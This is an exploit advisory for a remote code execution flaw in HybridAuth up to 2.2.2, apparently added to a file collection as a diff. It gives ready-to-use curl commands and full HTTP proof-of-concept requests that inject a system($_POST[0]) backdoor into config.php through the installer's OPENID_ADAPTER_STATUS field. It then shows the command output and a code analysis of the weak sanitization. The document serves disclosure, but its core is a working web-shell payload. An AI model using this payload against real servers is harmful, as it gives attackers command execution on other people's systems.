@@ -1,0 +1,197 @@
+######################################################################
+#  _     ___  _   _  ____  ____    _  _____
+#  | |   / _ \| \ | |/ ___|/ ___|  / \|_   _|
+#  | |  | | | |  \| | |  _| |     / _ \ | |
+#  | |__| |_| | |\  | |_| | |___ / ___ \| |
+#  |_____\___/|_| \_|\____|\____/_/   \_\_|
+#
+# HybridAuth <= 2.2.2 Remote Code Execution
+# Website : http://hybridauth.sourceforge.net/
+# Exploit Author : @u0x (Pichaya Morimoto)
+# Release dates : August 5, 2014
+#
+# Special Thanks to 2600 Thailand group
+# https://www.facebook.com/groups/2600Thailand/ , http://2600.in.th/
+#
+########################################################################
+
+[+] Description
+============================================================
+HybridAuth enable developers to easily build social applications to engage
+websites
+vistors and customers on a social level by implementing social signin,
+social sharing,
+users profiles, friends list, activities stream, status updates and more.
+
+
+[+] Exploit (New Version)
+============================================================
+
+I just found that the latest development version (2.2.2-dev) in Github was
+trying to patch this months ago.
+
+https://github.com/hybridauth/hybridauth/commit/574953517cda02eb631d68879bbc4f203fd203b9#diff-7fa84e199bd97f30cea5aea71735379c
+
+...
+    function stringSanitization($string)
+    {
+        $string = strip_tags($string);
+        $string = htmlentities($string, ENT_QUOTES, 'UTF-8');
+        return $string;
+    }
+...
+        foreach( $_POST AS $k => $v ):
+            $v = stringSanitization($v); <--- sanitize ???
+            $k = stringSanitization($k); <--- sanitize ???
+            $z = "#$k#";
+            $CONFIG_TEMPLATE = str_replace( $z, $v, $CONFIG_TEMPLATE );
+        endforeach;
+...
+
+However, the sanitization is not sufficient to prevent PHP code injection.
+We can inject to next value that will never be sanitized with
+htmlentities() :/
+
+Note that the default installation leave "install.php" untouched.
+$ curl http://victim/hybridauth/install.php -d
+'OPENID_ADAPTER_STATUS=system($_POST[0]))));/*'
+$ curl http://victim/hybridauth/config.php -d '0=id;ls -lha'
+
+
+
+[+] Proof-of-Concept
+============================================================
+PoC Environment: Ubuntu 14.04, PHP 5.5.9, Apache 2.4.7
+
+1. Inject Evil PHP Backdoor
+POST /hybridauth_git/install.php HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: th,en-us;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+
+OPENID_ADAPTER_STATUS=system($_POST[0]))));/*
+
+HTTP/1.1 200 OK
+Date: Tue, 05 Aug 2014 02:13:52 GMT
+Server: Apache
+X-Powered-By: PHP/5.5.9-1ubuntu4.3
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Frame-Options: sameorigin
+Content-Length: 2467
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>HybridAuth Installer</title>
+...
+
+2. Gaining access to the PHP backdoor
+POST /hybridauth_git/config.php HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: th,en-us;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+
+0=id;ls%20-lha
+
+HTTP/1.1 200 OK
+Date: Tue, 05 Aug 2014 02:15:16 GMT
+Server: Apache
+X-Powered-By: PHP/5.5.9-1ubuntu4.3
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Frame-Options: sameorigin
+Content-Length: 397
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+total 76K
+drwxrwxrwx  3 longcat longcat 4.0K Aug  5 08:34 .
+drwxrwxr-x 25 longcat longcat  16K Aug  5 08:47 ..
+drwxrwxrwx  5 longcat longcat 4.0K Aug  5 08:34 Hybrid
+- -rwxrwxrwx  1 longcat longcat 2.5K Aug  5 09:13 config.php
+- -rwxrwxrwx  1 longcat longcat  488 Aug  5 08:34 index.php
+- -rwxrwxrwx  1 longcat longcat  18K Aug  5 08:34 install.php
+
+[+] Vulnerability Analysis
+============================================================
+
+Filename: ./install.php
+...
+    function stringSanitization($string)
+    {
+        $string = strip_tags($string);
+        $string = htmlentities($string, ENT_QUOTES, 'UTF-8'); <-- LoL
+        return $string;
+    }
+...
+if( count( $_POST ) ): <-- user controlled input HTTP POST data
+    \/-- Read a template file
+    $CONFIG_TEMPLATE = file_get_contents( "Hybrid/resources/config.php.tpl"
+);
+
+    foreach( $_POST AS $k => $v ):
+        $v = stringSanitization($v);
+        $k = stringSanitization($k);
+        $z = "#$k#";
+
+        \/-- #POST data's keys# found in template file will be replaced
+with POST data's values
+            | so we can simply replace these existing values with something
+fun :)
+        $CONFIG_TEMPLATE = str_replace( $z, $v, $CONFIG_TEMPLATE );
+    endforeach;
+    ...
+    \/-- upload that replaced template contents into config.php
+    $is_installed = file_put_contents( $GLOBAL_HYBRID_AUTH_PATH_BASE .
+"config.php",  $CONFIG_TEMPLATE );
+...
+
+Filename: ./Hybrid/resources/config.php.tpl
+...
+return
+    array(
+        "base_url" => "#GLOBAL_HYBRID_AUTH_URL_BASE#",
+
+        "providers" => array (
+            // openid providers
+            "OpenID" => array (
+                "enabled" => #OPENID_ADAPTER_STATUS# <-- #..# will be
+replaced with arbitrary PHP code
+            ),
+...
+
+So this is what injected "config.php" looks like...
+Filename: ./config.php
+<?php
+...
+return
+    array(
+        "base_url" => "#GLOBAL_HYBRID_AUTH_URL_BASE#",
+
+        "providers" => array (
+            // openid providers
+            "OpenID" => array (
+                "enabled" => system($_POST[0]))));/*
+            ),
+...
+
+Pwned again,
+LongCat
